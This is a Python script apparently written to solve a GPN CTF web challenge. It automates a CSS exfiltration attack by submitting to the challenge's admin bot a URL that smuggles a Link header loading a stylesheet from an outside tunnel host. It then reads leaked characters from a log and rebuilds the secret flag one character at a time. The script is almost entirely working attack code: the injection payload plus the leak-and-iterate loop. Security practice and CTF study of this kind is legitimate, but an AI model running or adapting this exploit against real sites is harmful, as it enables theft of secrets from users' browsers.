#!/usr/bin/env python3
"""Automated CSS exfiltration iteration."""
import urllib.parse
import urllib.request
import time
import os
import sys

INSTANCE = "https://<the-challenge-instance>.gpn24.ctf.kitctf.de"
CSS_URL = "https://<sub>.serveousercontent.com/style.css"
PREFIX_FILE = "/tmp/exfil_prefix.txt"
LOG_FILE = "/tmp/exfil_log.txt"

def get_prefix():
    return open(PREFIX_FILE).read()

def set_prefix(p):
    with open(PREFIX_FILE, 'w') as f:
        f.write(p)

def get_last_leak():
    """Get most recent LEAK char from log, or None."""
    try:
        with open(LOG_FILE) as f:
            lines = [l for l in f.read().split('\n') if l.startswith('LEAK:')]
        if not lines:
            return None
        last = lines[-1]
        # Format: LEAK: 'c'
        char = last.split(': ', 1)[1].strip()
        # Strip quotes
        if char.startswith("'") and char.endswith("'"):
            return char[1:-1]
        return char
    except:
        return None

def clear_log():
    open(LOG_FILE, 'w').close()

def submit_bot():
    injection = '?' + urllib.parse.quote(f'>,<{CSS_URL}>;rel=stylesheet,</x', safe='')
    target = f"http://localhost:8080/{injection}"
    enc = urllib.parse.quote(target, safe='')
    url = f"{INSTANCE}/bot/run?url={enc}"
    print(f"Submit: {url[:120]}...", flush=True)
    try:
        resp = urllib.request.urlopen(url, timeout=60).read().decode()
        return resp.strip()
    except Exception as e:
        return f"ERR: {e}"

def main():
    flag = "flag=GPNCTF{codE_gOLF_i5_fUN__firEF0x_FEA7uRe5_"  # current known flag prefix
    print(f"Starting with: {flag!r}", flush=True)
    
    max_iters = 80
    consecutive_failures = 0
    
    for i in range(max_iters):
        # Set prefix in server
        set_prefix(f"fetch('{flag}")
        clear_log()
        
        resp = submit_bot()
        print(f"  Iter {i}: bot resp: {resp}", flush=True)
        if resp.startswith('ERR'):
            time.sleep(5)
            consecutive_failures += 1
            if consecutive_failures > 3:
                print("Too many failures", flush=True)
                break
            continue
        
        # Wait for leak (bot sleeps 30s)
        deadline = time.time() + 60
        leaked = None
        while time.time() < deadline:
            leaked = get_last_leak()
            if leaked is not None:
                break
            time.sleep(2)
        
        if leaked is None:
            print(f"  No leak! flag so far: {flag!r}", flush=True)
            consecutive_failures += 1
            if consecutive_failures > 3:
                print(f"FLAG (best guess): {flag!r}", flush=True)
                break
            continue
        
        consecutive_failures = 0
        flag += leaked
        print(f"  LEAKED {leaked!r}, flag: {flag!r}", flush=True)
        
        if '}' in flag or leaked == '}':
            print(f"DONE! FLAG: {flag!r}", flush=True)
            return

if __name__ == "__main__":
    main()
